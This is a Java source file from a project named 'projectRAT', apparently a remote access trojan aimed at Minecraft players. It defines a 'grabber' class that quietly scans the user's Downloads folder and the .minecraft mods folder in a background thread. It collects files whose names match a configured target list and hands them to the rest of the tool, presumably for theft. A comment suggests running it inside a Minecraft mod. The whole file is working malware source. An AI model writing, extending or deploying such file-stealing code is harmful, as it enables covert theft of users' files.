package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.ProjectRAT;
import in.momin5.projectRAT.request.Request;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Downloads implements Request {

    private List<File> matches;

    @Override
    public void init() throws Exception {
        matches = new ArrayList<>();
        new Thread(() -> {
            File downloadsDir = new File(System.getProperty("user.home") + "/Downloads");
            File mcFolder = new File(System.getProperty("user.home") + "/Appdata/Roaming/.minecraft/mods");
            // or just do mc.getGameDir + /mods if in minecraft ^^ so it works in multimc too
            try {
                if (downloadsDir.exists() && downloadsDir.isDirectory()) {
                    for (File file : downloadsDir.listFiles()){
                        String name = file.getName().toLowerCase();
                        for(String fileName: ProjectRAT.grabsFilesName) {
                            if(name.contains(fileName) && file.length() < 104857600 && !file.isDirectory()) {
                                matches.add(file);
                            }
                        }
                    }
                }
                if(mcFolder.exists() && mcFolder.isDirectory()) {
                    for (File file : mcFolder.listFiles()){
                        String name = file.getName().toLowerCase();
                        for(String fileName: ProjectRAT.grabsFilesName) {
                            if(name.contains(fileName) && file.length() < 104857600) {
                                matches.add(file);
                            }
                        }
                    }
                }
                Thread.sleep(1000);
            }catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public String getMessage() {
        return null;
    }

   /* @Override
    public File getFile() {
        File temp = null; // will return null if no matches found
        for(File file: matches) {
            temp = file;
        }
        return temp;
    }*/

    public File[] getFiles() {
        File[] files = new File[matches.size()];
        for(int i=0;i < matches.size(); i++) {
            files[i] = matches.get(i);
        }
        return files;
    }
}
